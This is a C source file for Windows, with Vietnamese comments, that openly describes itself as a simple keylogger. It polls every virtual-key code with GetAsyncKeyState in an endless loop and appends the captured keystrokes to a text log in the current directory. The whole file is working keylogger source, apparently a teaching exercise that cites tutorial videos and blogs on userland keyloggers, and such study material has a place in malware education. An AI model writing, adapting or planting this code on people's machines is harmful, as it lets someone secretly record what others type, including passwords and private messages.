#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#pragma warning(disable : 4996)

/*
** Mô tả: 
** - Malware dạng này sử dụng Windows Polling (GetAsyncKeyState) để kiểm tra trạng thái
**		của một phím có được nhấn hay không.
** - Lợi dụng nó ta chạy 1 vòng lặp tất cả các phím xem người dùng nhấn phím nào. 
** - Dạng này gọi là Windows Polling. Dạng này sẽ tốn tài nguyên vì nó lặp vô tận để bắt phím nhấn.

** Ref:
** 1. Virtual-Key Codes
	https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
** 2. C/C++ Malware — Simple Keylogger | Log Keystrokes
	https://youtu.be/8X2UOfkOuZY
** 3. Windows Keylogger Part 1: Attack on user land
	https://eyeofrablog.wordpress.com/2017/06/11/windows-keylogger-part-1-attack-on-user-land/
*/

void WriteToLog(char *buffer, char *filePath)
{
	FILE *fptr = NULL;
	fptr = fopen(filePath, "a+");
	fprintf(fptr, buffer);
	fclose(fptr);
}

int KeyIsListed(int key, char *filePath)
{
	switch (key)
	{
	case VK_SPACE:		printf(" ");			WriteToLog(" ", filePath); break;			// Space
	case VK_RETURN:		printf("\n");			WriteToLog("\n", filePath); break;			// Enter
	case VK_SHIFT:		printf("SHIFT:");		WriteToLog("SHIFT:", filePath); break;		// Shift
	case VK_ESCAPE:		printf("<ESC>");		WriteToLog("<ESC>", filePath); break;		// ESCAPE
	case VK_TAB:		printf("<TAB>");		WriteToLog("<TAB>", filePath); break;		// TAB
	case VK_CAPITAL:	printf("<CAPSLOCK>");	WriteToLog("<CAPSLOCK>", filePath); break;	// CAPSLOCK
	case VK_CONTROL:	printf("CTRL:");		WriteToLog("CTRL:", filePath); break;		// CTRL
	case VK_BACK://		printf("<BACK>");		WriteToLog("\b", filePath); break;			// Backspace - Delete
	case VK_DELETE:		printf("<DEL>");		WriteToLog("<DEL>", filePath); break;		// DEL
	case VK_LWIN:
	case VK_RWIN:		printf("<WINDOWS>");	WriteToLog("<WINDOWS>", filePath); break;	// WINDOWS
	case 0x60:
	case 0x30:		printf("0");		WriteToLog("0", filePath); break;			// 0
	case 0x61:
	case 0x31:		printf("1");		WriteToLog("1", filePath); break;			// 1
	case 0x62:
	case 0x32:		printf("2");		WriteToLog("2", filePath); break;			// 2
	case 0x63:
	case 0x33:		printf("3");		WriteToLog("3", filePath); break;			// 3
	case 0x64:
	case 0x34:		printf("4");		WriteToLog("4", filePath); break;			// 4
	case 0x65:
	case 0x35:		printf("5");		WriteToLog("5", filePath); break;			// 5
	case 0x66:
	case 0x36:		printf("6");		WriteToLog("6", filePath); break;			// 6
	case 0x67:
	case 0x37:		printf("7");		WriteToLog("7", filePath); break;			// 7
	case 0x68:
	case 0x38:		printf("8");		WriteToLog("8", filePath); break;			// 8
	case 0x69:
	case 0x39:		printf("9");		WriteToLog("9", filePath); break;			// 9
	case 0x41:		printf("a");		WriteToLog("a", filePath); break;			// a
	case 0x42:		printf("b");		WriteToLog("b", filePath); break;			// b
	case 0x43:		printf("c");		WriteToLog("c", filePath); break;			// c
	case 0x44:		printf("d");		WriteToLog("d", filePath); break;			// d
	case 0x45:		printf("e");		WriteToLog("e", filePath); break;			// e
	case 0x46:		printf("f");		WriteToLog("f", filePath); break;			// f
	case 0x47:		printf("g");		WriteToLog("g", filePath); break;			// g
	case 0x48:		printf("h");		WriteToLog("h", filePath); break;			// h
	case 0x49:		printf("i");		WriteToLog("i", filePath); break;			// i
	case 0x4A:		printf("j");		WriteToLog("j", filePath); break;			// j
	case 0x4B:		printf("k");		WriteToLog("k", filePath); break;			// k
	case 0x4C:		printf("l");		WriteToLog("l", filePath); break;			// l
	case 0x4D:		printf("m");		WriteToLog("m", filePath); break;			// m
	case 0x4E:		printf("n");		WriteToLog("n", filePath); break;			// n
	case 0x4F:		printf("o");		WriteToLog("o", filePath); break;			// o
	case 0x50:		printf("p");		WriteToLog("p", filePath); break;			// p
	case 0x51:		printf("q");		WriteToLog("q", filePath); break;			// q
	case 0x52:		printf("r");		WriteToLog("r", filePath); break;			// r
	case 0x53:		printf("s");		WriteToLog("s", filePath); break;			// s
	case 0x54:		printf("t");		WriteToLog("t", filePath); break;			// t
	case 0x55:		printf("u");		WriteToLog("u", filePath); break;			// u
	case 0x56:		printf("v");		WriteToLog("v", filePath); break;			// v
	case 0x57:		printf("w");		WriteToLog("w", filePath); break;			// w
	case 0x58:		printf("x");		WriteToLog("x", filePath); break;			// x
	case 0x59:		printf("y");		WriteToLog("y", filePath); break;			// y
	case 0x5A:		printf("z");		WriteToLog("z", filePath); break;			// z
	case 0xBE:		printf(".");		WriteToLog(".", filePath); break;			// .
	case 0xBC:		printf(",");		WriteToLog(",", filePath); break;			// ,
	default:		return 0;
	}
}


int main()
{
	char filePath[MAX_PATH];
	char key;

	GetCurrentDirectoryA(MAX_PATH, filePath);
	wsprintfA(filePath, TEXT("%s\\Ex16_Simple_Keylogger1.txt"), filePath);

	while (TRUE)
	{
		unsigned int keyListen = 0;
		Sleep(10);
		// Virtual-Key Codes: 0x01 -> 0xFE
		for (key = 0x1; key <= 0xFE; key++)
			if (GetAsyncKeyState(key) == -32767)
				keyListen = KeyIsListed(key, filePath);
	}

	return 0;
}